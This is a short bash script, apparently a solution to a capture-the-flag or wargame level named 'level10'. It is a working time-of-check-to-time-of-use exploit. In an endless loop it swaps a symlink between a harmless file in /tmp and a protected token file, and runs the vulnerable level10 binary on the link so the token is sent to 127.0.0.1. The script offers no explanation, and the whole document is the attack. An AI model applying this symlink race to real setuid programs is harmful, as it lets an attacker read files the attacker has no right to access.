#!/bin/bash

while true
do
	ln -fs /tmp/toto /tmp/sym &
	./level10 /tmp/sym 127.0.0.1 &
	ln -fs /home/user/level10/token /tmp/sym &
done